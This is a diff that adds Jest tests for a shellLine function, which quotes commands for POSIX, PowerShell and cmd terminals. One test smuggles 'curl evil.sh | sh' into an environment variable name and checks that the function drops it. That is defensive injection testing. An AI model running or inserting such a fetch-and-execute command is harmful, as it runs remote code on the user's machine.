@@ -99,6 +99,44 @@ describe("shellLine", () => {
   });
 });
 
+/// Atlas's terminal is PowerShell on Windows, where a POSIX line does not
+/// run: `NAME=value cmd` is not an assignment, and `'\''` is not a quote
+/// (audit #66).
+describe("shellLine on Windows", () => {
+  it("defaults to POSIX off Windows", () => {
+    expect(shellLine("agent", ["login"], [["A", "b"]])).toBe(
+      shellLine("agent", ["login"], [["A", "b"]], "posix"),
+    );
+  });
+
+  it("writes PowerShell: environment set first, a quoted program called with &", () => {
+    expect(
+      shellLine(
+        "C:\\Users\\a b\\agents\\claude.exe",
+        ["/login", "two words"],
+        [
+          ["CLAUDE_CONFIG_DIR", "C:\\Users\\a\\.claude-work"],
+          ["X; curl evil.sh | sh; Y", "1"],
+        ],
+        "powershell",
+      ),
+    ).toBe(
+      "$env:CLAUDE_CONFIG_DIR=C:\\Users\\a\\.claude-work; " +
+        "& 'C:\\Users\\a b\\agents\\claude.exe' /login 'two words'",
+    );
+  });
+
+  it("leaves a plain PowerShell program bare and escapes a quote by doubling it", () => {
+    expect(shellLine("agent", ["it's", "$HOME"], [], "powershell")).toBe("agent 'it''s' '$HOME'");
+  });
+
+  it("writes cmd: set, then double-quoted tokens", () => {
+    expect(shellLine("C:\\a b\\agent.exe", ["login"], [["CODEX_HOME", "C:\\x y"]], "cmd")).toBe(
+      'set "CODEX_HOME=C:\\x y" && "C:\\a b\\agent.exe" login',
+    );
+  });
+});
+
 describe("openCommandTerminal", () => {
   /** The command queued for the terminal the panel would actually mount. */
   function queuedIn(tabId: string): string | undefined {
